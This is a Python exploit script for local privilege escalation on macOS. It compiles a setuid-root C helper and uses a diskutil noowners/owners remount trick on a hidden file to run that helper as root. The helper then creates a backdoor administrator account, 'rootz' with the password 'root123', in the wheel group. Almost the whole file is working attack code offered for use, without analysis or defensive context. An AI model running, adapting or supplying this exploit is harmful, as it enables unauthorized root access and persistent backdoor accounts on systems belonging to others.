import os
import subprocess
import tempfile
import getpass

# Define file paths in the current directory
current_directory = os.getcwd()
payload_source_path = os.path.join(current_directory, "suidhelper.c")
payload_binary_path = os.path.join(current_directory, "suidhelper")
target_file_path = os.path.join(current_directory, ".file")  # Target file in current directory
sudoers_tmp_path = os.path.join(current_directory, "sudoers_tmp")
disk_identifier = "/dev/disk3s4"
current_user = getpass.getuser()  # Get the current username

# Function to execute commands and handle errors
def execute_command(command):
    process = subprocess.run(command, shell=True, capture_output=True, text=True, check=False)
    if process.returncode != 0:
        print(f"Error executing command: {command}")
        print(f"Stdout: {process.stdout}")
        print(f"Stderr: {process.stderr}")
        return False
    return True

# Function to create privilege escalation payload that adds user to admin and suoppl groups
def create_payload():
    payload_content = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <pwd.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <new_username> <new_password>\\n", argv[0]);
        return 1;
    }

    setuid(0);

    char *new_username = argv[1];
    char *new_password = argv[2];
    char cmd[512];

    // Check if the user already exists
    struct passwd *pwd = getpwnam(new_username);
    if (pwd != NULL) {
        printf("User '%s' already exists.\\n", new_username);
        return 0;
    }

    // Create the new user
    snprintf(cmd, sizeof(cmd), "/usr/sbin/sysadminctl -addUser %s -password %s -shell /bin/bash", new_username, new_password);
    printf("Creating user '%s' with password '%s' and bash shell...\\n", new_username, new_password);
    if (system(cmd) != 0) {
        perror("Error creating user");
        return 1;
    }

    // Add the new user to the wheel group for root access
    snprintf(cmd, sizeof(cmd), "/usr/sbin/dseditgroup -o edit -a %s -t user wheel", new_username);
    printf("Adding user '%s' to the 'wheel' group (root access)...\\n", new_username);
    if (system(cmd) != 0) {
        perror("Error adding user to wheel group");
        // Attempt to remove the user if adding to wheel fails
        snprintf(cmd, sizeof(cmd), "/usr/sbin/sysadminctl -deleteUser %s", new_username);
        system(cmd);
        return 1;
    }

    printf("Successfully created user '%s' with root access.\\n", new_username);

    return 0;
}
"""
    with open(payload_source_path, "w") as f:
        f.write(payload_content)

    compile_command = f"gcc {payload_source_path} -o {payload_binary_path}"
    chmod_command = f"chmod +s {payload_binary_path}"

    if not execute_command(compile_command) or not execute_command(chmod_command):
        print("Error creating payload.")
        return False

    return True

# Function to mount filesystem with "noowners" flag
def mount_filesystem():
    mount_command = f"diskutil mount -mountOptions noowners {disk_identifier}"
    return execute_command(mount_command)

# Function to make .file writable
def modify_file_permissions():
    chmod_command = f"chmod 777 {target_file_path}"
    return execute_command(chmod_command)

# Function to copy setuid helper binary into .file
def copy_payload():
    cp_command = f"cp {payload_binary_path} {target_file_path}"
    return execute_command(cp_command)

# Function to set permissions and setuid bit for .file
def set_file_permissions():
    chmod_command = f"chmod +sx {target_file_path}"
    return execute_command(chmod_command)

# Function to remount filesystem in "owners" and "suid" mode
def remount_filesystem():
    remount_command = f"diskutil mount -mountOptions owners,suid {disk_identifier}"
    return execute_command(remount_command)

# Function to execute the privilege escalation payload
def execute_payload():
    execute_command(f"{target_file_path} rootz root123")
    print("Attempted to create user 'rootz' with password 'root123' and grant root access.")
    print("You should now be able to log in as 'rootz' with the password 'root123'.")

    # Clean up temp files in current directory
    if os.path.exists(sudoers_tmp_path):
        try:
            os.remove(sudoers_tmp_path)
            print(f"Cleaned up temporary file: {sudoers_tmp_path}")
        except Exception as e:
            print(f"Warning: Failed to clean up {sudoers_tmp_path}: {e}")

    return True

# Main function to execute exploit
def exploit():
    try:
        print("Starting privilege escalation to create a new root user...")

        # Step 1: Create privilege escalation payload
        print("Creating payload...")
        if not create_payload():
            return

        # Step 2: Mount filesystem with "noowners" flag
        print("Mounting filesystem with noowners flag...")
        if not mount_filesystem():
            return

        # Step 3: Create the target file
        print("Creating target file...")
        with open(target_file_path, "w") as f:
            pass  # Just create an empty file

        # Step 4: Make .file writable
        print("Making target file writable...")
        if not modify_file_permissions():
            return

        # Step 5: Copy payload binary into .file
        print("Copying payload to target location...")
        if not copy_payload():
            return

        # Step 6: Set permissions and setuid bit for .file
        print("Setting permissions for target file...")
        if not set_file_permissions():
            return

        # Step 7: Remount filesystem in "owners" and "suid" mode
        print("Remounting filesystem with owners and suid flags...")
        if not remount_filesystem():
            return

        # Step 8: Execute privilege escalation payload
        print("Executing privilege escalation...")
        execute_payload()

    except Exception as e:
        print(f"Error executing exploit: {e}")

# Execute exploit
if __name__ == "__main__":
    exploit()
